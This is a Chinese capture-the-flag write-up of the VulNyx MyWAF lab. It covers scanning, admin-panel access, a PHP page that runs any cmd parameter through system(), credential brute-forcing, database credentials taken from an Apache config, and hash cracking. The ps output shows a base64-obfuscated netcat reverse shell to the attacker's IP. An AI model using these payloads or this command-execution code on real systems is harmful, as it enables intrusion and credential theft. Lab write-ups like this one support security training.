---
title: VulNyx MyWAF靶机复盘
author: LingMj
data: 2025-01-21
categories: [VulNyx]
tags: [domain,brute,printf,php]
description: 难度-Medium
---

## 网段扫描
```
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:df:e2:a7, IPv4: 192.168.26.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.26.2    00:50:56:e8:d4:e1       VMware, Inc.
192.168.26.1    00:50:56:c0:00:08       VMware, Inc.
192.168.26.189  00:0c:29:02:ee:4a       VMware, Inc.
192.168.26.254  00:50:56:e5:dc:17       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.578 seconds (99.30 hosts/sec). 4 responded
```

## 端口扫描

```
└─# nmap -p- -sC -sV 192.168.26.189       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-21 00:54 EST
Nmap scan report for 192.168.26.189 (192.168.26.189)
Host is up (0.0091s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 1c:ec:5c:5b:fd:fc:ba:f3:4c:1b:0b:70:e6:ef:bf:12 (ECDSA)
|_  256 26:18:c8:ec:34:aa:d5:b9:28:a1:e2:83:b0:d3:45:2e (ED25519)
80/tcp   open  http    Apache httpd 2.4.59
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.59 (Debian)
3306/tcp open  mysql   MySQL 5.5.5-10.11.6-MariaDB-0+deb12u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.11.6-MariaDB-0+deb12u1
|   Thread ID: 33
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, SupportsTransactions, Speaks41ProtocolNew, IgnoreSigpipes, ConnectWithDatabase, FoundRows, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, InteractiveClient, ODBCClient, SupportsCompression, LongColumnFlag, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: xU$ODFr.-3[P^is(gSIT
|_  Auth Plugin Name: mysql_native_password
MAC Address: 00:0C:29:02:EE:4A (VMware)
Service Info: Host: mywaf.mywaf.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.86 seconds
```

## 获取webshell
![图 0](../assets/images/d28e14b300bfd13304ebac358f4a1b4fd3e961797fd885219fe62195343eea6b.png)  
>存在域名，但是没看到扫子域名吧
>
![图 1](../assets/images/8f2dd3dfb0dc508f720c28e2bc0b8abbb1d056912b3f3f1050362f3564e71bcf.png)  
![图 2](../assets/images/a741ce273fab1b46f4b71a601f3b11043f6ee36148a0a8a936feec0cada92b51.png)
>账号：admin，好像是密码123456，主要抓包直接进去了
>  
![图 3](../assets/images/a488981adbda9cf0aaa6781e766ca779e08290a247c42c1b7e4f69d99dbf6303.png)  
![图 4](../assets/images/d5f31c6696782f9d626b7718e08cf995758d3f7c471affd902e76d1c776a66f5.png)  
![图 5](../assets/images/7f440794b8a42013edda1a6fd8895613129e29c8801f72b937aa9beacc9026de.png)  

>两个子域名
>
![图 6](../assets/images/bf0415ed690e00ea1a7284eacaad9dae548a724970442bac3f753ff89c9bff31.png)  
![图 7](../assets/images/fdd7c14607eaf08626582d34092b2a02b1111168d5dacd978fd7be22b152a8f8.png)  
![图 8](../assets/images/711017b9d654727c6dab225a12f8e81f3fdbdbe90abcec3932c8a5ecb4f24ed8.png)  
![图 9](../assets/images/91fa2c211441469e0096360e75a945d0c722d518fb3561a408a99254766b51a1.png)  

>可以执行命令但是不能拼接命令，爆破密码吧
>
![图 10](../assets/images/3cad302a27a5ec9fc99dc0d7ac41000a22ce3e329bdfe4ef3bceb2aefcd464f7.png)  
![图 11](../assets/images/418bd976fc1ddd534c9a55c4dec577403c2045caf3f6ba550906df3785b4bf3b.png)  
![图 12](../assets/images/05ac08f9ce7ee086c412e2c5803a6810542f343070401b433ba50b76898213a3.png)  
![图 13](../assets/images/d9347126a58dd04d45dc6dfd74d1bdb7f9146b08b5be8b150894582961a0e77a.png)  
![图 14](../assets/images/5de806fe5feb272a2b35dfb7d1ad60a607af1538b744d1c4831d8a421ed82cf4.png)
![图 16](../assets/images/20f134fb472dbbe2a9ff59e32e9f8944779113d5e1d89b3a1d0f8e4202d7e083.png)  
![图 15](../assets/images/e4012ce5ce6b103b74725adf87913c81f67da083c9307c29fee4974f694787ed.png)  

>注入一下
>

![图 17](../assets/images/36f995c4cd267133fd0232a9a130d215dd43b4f9c4022c37fb9a7e8c452c2698.png)  
![图 18](../assets/images/bbababdada535d9c73d3589be906f0332156b18ab9854b9e5aea9d65c1bc268b.png)  
![图 19](../assets/images/64cbf7ce2754780fb3ba05dc8cc670c819ceee6b09f2966b9fd9efc2d10c0ee7.png)  
![图 20](../assets/images/2022a03ec94d6b74f592191f10c1018c4a2c07a5fce34ee68e656a2f1f3b4dbd.png)  
![图 21](../assets/images/c46758f6e9f9478755a30207913a89fe548611c862e0ce4c8b84fa7694f12b9d.png)  

>找到解了
>

```
<!DOCTYPE html>
<html>
<body>
    <h1>EjecuciÃ³n de comandos</h1>
    <p>A continuaciÃ³n puede ejecutar comandos para el mantenimiento del servidor</p>
    <form>
        <input type="text" name="cmd">
        <input type="submit" value="Ejecutar">
    </form>
    <br>
    <?php 
    if (isset($_GET['cmd']) && !empty($_GET['cmd'])) {
        echo '<h2>'.htmlspecialchars($_GET['cmd']).'</h2><pre>';
        system($_GET['cmd']);
        echo '</pre>';
    }
?>
</body>
</html> 

```

>这里存在接管道，可以测试什么命令可以解
>

![图 22](../assets/images/51bd8a9fda05020c951c22c65805e9c927521390f362d306ab4c916e65391a75.png)

![图 23](../assets/images/648dc897132527d8e711cd2e1accfde2f0ca604117e444ad75873488327c3b68.png)

![图 24](../assets/images/05402d098cb79630e32a41a9a69e97b971412de7592c8e2aef4a19e108dc5f1e.png)

![图 25](../assets/images/a2341236d53685c4681764ddae28a6a491a9dac1bc675198c92fbaae3595d849.png)

![图 26](../assets/images/28846f82d562f6dbab9e0f4fd671919a3f679e3e3f82d696c5823221a409ffb2.png)

![图 28](../assets/images/f8e628fc5a7cf3714f3537557a3c5f8971d6d8b47ff6ad8cba23239d2460c796.png)

![图 27](../assets/images/bf05516295b311ee29db316f38f94989494eedb08c48a331fe6d6a937d1f5971.png) 


## 提权
```
www-data@mywaf:/var/www/maintenance.mywaf.nyx$ ls -al                  
total 12
drwxr-xr-x 2 root root 4096 Jun 18  2024 .
drwxr-xr-x 6 root root 4096 Jun 18  2024 ..
-rw-r--r-- 1 root root  481 Jun 18  2024 index.php
www-data@mywaf:/var/www/maintenance.mywaf.nyx$ cd 
bash: cd: HOME not set
www-data@mywaf:/var/www/maintenance.mywaf.nyx$ sudo -l
[sudo] password for www-data: 
sudo: a password is required
www-data@mywaf:/var/www/maintenance.mywaf.nyx$ cd ..
www-data@mywaf:/var/www$ ls a-l
ls: cannot access 'a-l': No such file or directory
www-data@mywaf:/var/www$ ls -al
total 32
drwxr-xr-x  6 root root 4096 Jun 18  2024 .
drwxr-xr-x 12 root root 4096 May 15  2024 ..
drwxr-xr-x  2 root root 4096 Jun 17  2024 configure.mywaf.nyx
drwxr-xr-x  2 root root 4096 Jun 16  2024 html
drwxr-xr-x  2 root root 4096 Jun 18  2024 maintenance.mywaf.nyx
-rw-r--r--  1 root root   82 Jun 18  2024 package-lock.json
-rw-r--r--  1 root root    3 Jun 18  2024 package.json
drwxr-xr-x  5 root root 4096 Jun 18  2024 www.mywaf.nyx
www-data@mywaf:/var/www$ cd /opt/
www-data@mywaf:/opt$ ls -al
total 12
drwxr-xr-x  3 root root 4096 Jun 19  2024 .
drwxr-xr-x 18 root root 4096 May 15  2024 ..
drwxr-xr-x  2 root root 4096 Jun 19  2024 phps
www-data@mywaf:/opt$ cd phps/
www-data@mywaf:/opt/phps$ ls -al
total 5532
drwxr-xr-x 2 root root    4096 Jun 19  2024 .
drwxr-xr-x 3 root root    4096 Jun 19  2024 ..
-rwxr-xr-x 1 root root 5654232 Jun 19  2024 php8.2
www-data@mywaf:/opt/phps$ cd php8.2 
bash: cd: php8.2: Not a directory
www-data@mywaf:/opt/phps$ ls -al
total 5532
drwxr-xr-x 2 root root    4096 Jun 19  2024 .
drwxr-xr-x 3 root root    4096 Jun 19  2024 ..
-rwxr-xr-x 1 root root 5654232 Jun 19  2024 php8.2
www-data@mywaf:/opt/phps$ ls -al
total 5532
drwxr-xr-x 2 root root    4096 Jun 19  2024 .
drwxr-xr-x 3 root root    4096 Jun 19  2024 ..
-rwxr-xr-x 1 root root 5654232 Jun 19  2024 php8.2
www-data@mywaf:/opt/phps$ ps -ef
root         427       2  0 07:26 ?        00:00:00 [irq/16-vmwgfx]
message+     428       1  0 07:26 ?        00:00:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root         432       2  0 07:26 ?        00:00:00 [cryptd]
root         439       1  0 07:26 ?        00:00:00 /lib/systemd/systemd-logind
root         460       1  0 07:26 ?        00:00:00 dhclient -4 -v -i -pf /run/dhclient.ens33.pid -lf /var/lib/dhcp/dhclient.ens33.leases -I -df /var/lib/dhcp/dhclient6.ens33.leases ens33
root         506       1  0 07:26 tty1     00:00:00 /sbin/agetty -o -p -- \u --noclear - linux
root         568       1  0 07:26 ?        00:00:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
mysql        658       1  0 07:26 ?        00:00:06 /usr/sbin/mariadbd
root         662       1  0 07:26 ?        00:00:03 /usr/sbin/apache2 -k start
root         664       1  0 07:26 ?        00:00:00 /bin/bash /root/monitor_modsecurityconf.sh
www-data     665       1  0 07:26 ?        00:00:00 /usr/bin/htcacheclean -d 120 -p /var/cache/apache2/mod_cache_disk -l 300M -n
root        1189       2  0 07:39 ?        00:00:05 [kworker/0:0-events_power_efficient]
root        1677       2  0 07:49 ?        00:00:00 [kworker/u2:0-events_unbound]
www-data    1860     662  0 07:56 ?        00:00:00 /usr/sbin/apache2 -k start
www-data    1861     662  0 07:56 ?        00:00:00 /usr/sbin/apache2 -k start
www-data    1862     662  0 07:56 ?        00:00:00 /usr/sbin/apache2 -k start
www-data    1863     662  0 07:56 ?        00:00:00 /usr/sbin/apache2 -k start
www-data    1866     662  0 07:56 ?        00:00:00 /usr/sbin/apache2 -k start
www-data    1884     662  0 07:56 ?        00:00:00 /usr/sbin/apache2 -k start
www-data    1894     662  0 07:56 ?        00:00:00 /usr/sbin/apache2 -k start
root        1914       2  0 07:56 ?        00:00:00 [kworker/u2:2-events_unbound]
www-data    2094    1863  0 08:03 ?        00:00:00 sh -c printf bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMjYuMTI4IDEyMzQ=|base64 -d|sh
www-data    2097    2094  0 08:03 ?        00:00:00 sh
www-data    2098    2097  0 08:03 ?        00:00:00 bash
www-data    2112     662  0 08:03 ?        00:00:00 /usr/sbin/apache2 -k start
www-data    2117    2098  0 08:03 ?        00:00:00 /usr/bin/script /dev/null -qc /bin/bash
www-data    2118    2117  0 08:03 pts/0    00:00:00 sh -c /bin/bash
www-data    2119    2118  0 08:03 pts/0    00:00:00 /bin/bash
root        2136       2  0 08:04 ?        00:00:00 [kworker/u2:1-events_unbound]
root        2164     664  0 08:05 ?        00:00:00 sleep 5
www-data    2165    2119 99 08:05 pts/0    00:00:00 ps -ef
```

>可以看见存在定时任务在跑，root         664       1  0 07:26 ?        00:00:00 /bin/bash /root/monitor_modsecurityconf.sh
>
>先拿user吧,记得有mysql服务

![图 29](../assets/images/3fc5d452ebb30a812c507e09a3eb7f33764194514444ad50e3b3ca0a905a475a.png)  
![图 30](../assets/images/aba4b9e910648c5ad366f841edc9486cf1e14392d0967ba3598e3496b3e456e8.png)  
![图 31](../assets/images/1c93d42742e93a41ae7a84ca333d108388eadb5f68cd7b59219effaa2056abf1.png)

```
cat /etc/apache2/sites-available/www.mywaf.nyx.conf
<VirtualHost *:80>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        ServerName www.mywaf.nyx

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/www.mywaf.nyx

        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with "a2disconf".
        #Include conf-available/serve-cgi-bin.conf
        SecRuleEngine On
        SecRule REQUEST_URI "^/private.php" "phase:1,id:1234567,t:none,t:lowercase,pass,nolog,ctl:requestBodyAccess=off"


        SetEnv DB "mywafdb"
        SetEnv DBUSER "mywafuser"
        SetEnv DBPASS "Ukf8T93VnbsXmDuh7WM4r5"

</VirtualHost>
```
```
www-data@mywaf:/tmp$ mysql -u mywafuser -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 39
Server version: 10.11.6-MariaDB-0+deb12u1 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mywafdb            |
+--------------------+
2 rows in set (0.000 sec)

MariaDB [(none)]> use mywafdb
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [mywafdb]> show tables;
+--------------------+
| Tables_in_mywafdb  |
+--------------------+
| niveles_proteccion |
| usuarios           |
+--------------------+
2 rows in set (0.000 sec)

MariaDB [mywafdb]> select * from usuarios;
+----+-------------+----------------------------------+----------------------------------+----------------------------------+
| id | usuario     | password                         | salt1                            | salt2                            |
+----+-------------+----------------------------------+----------------------------------+----------------------------------+
|  1 | nohydragent | 53199f8a05fec6a7e686b6f816e73995 | 598afc235e17f253bfa3d5d1d221829c | ef14766b1e61bd9392215cc3160d628d |
|  2 | admin       | 4e7288691951cdfe272aa000164096bb | cb2efb178a176059fab20604d5d86ef9 | 76242b870f3e89e36d0b99fc825f43b5 |
+----+-------------+----------------------------------+----------------------------------+----------------------------------+
2 rows in set (0.001 sec)

MariaDB [mywafdb]> 
```

![图 32](../assets/images/4099bb6aeaf3ebb03a5254ab7579be114d5481a35ce9e0e8856f537358db3e40.png)
>这个爆破密码费劲，用opt吧，一个php
>  
![图 33](../assets/images/14b11d762166999470a7feb3d3b35e63ae26e28f8cdf812953fe3c82f65a7bde.png)  
![图 34](../assets/images/895b8267f514399788c3416766c476aef5df831d8ae74ce7d0ef3daf83fd7c13.png)  

>没成功，不过应该是个bug，还是爆破user吧
>
![图 35](../assets/images/402fb1306143073e158a843c7e33554543f87bf876749448360d5963b67e38fb.png)

>密码为：369852147
>

![图 36](../assets/images/1b616a1751d2008b1f3a83dd4a1ec22260aee7a40dc126c44536eccbc303ee38.png)  


```
└─# johnjohn --format=dynamic_16 --list=format-all-details 
Format label                         dynamic_16
 Disabled in configuration file      no
Min. password length                 0
Max. password length                 36 [worst case UTF-8] to 110 [ASCII]
Min. keys per crypt                  48
Max. keys per crypt                  3360
Flags
 Case sensitive                      yes
 Truncates at max. length            no
 Supports 8-bit characters           yes
 Converts internally to UTF-16/UCS-2 no
 Honours --encoding=NAME             n/a
 Collisions possible (as in likely)  no
 Uses a bitslice implementation      no
 The split() method unifies case     yes
 Supports very long hashes           no
 Internal mask generation            no
 A $dynamic$ format                  yes (Flat buffer SIMD)
 A dynamic sized salt                no
 Parallelized with OpenMP            no
Number of test vectors               24
Algorithm name                       md5(md5(md5($p).$s).$s2) 256/256 AVX2 8x3
Format name                          
Benchmark comment                    
Benchmark length                     7 (0x7, many salts speedup)
Binary size                          16
Salt size                            32
Tunable cost parameters              
Example ciphertext                   $dynamic_16$5ce496c635f96ac1ccd87518d4274b49$aaaSXB$$2salt2
```

![图 37](../assets/images/25622cb702f5554940a20b0e886462b1db1b3d3ae27a1bafd09ff4786a22eac5.png)  


>userflag:219074c9ca90fe6fe025e7eb4e67b3bf
>
>rootflag:0fe16399c94ba69bc4e499d85b1b27d7
>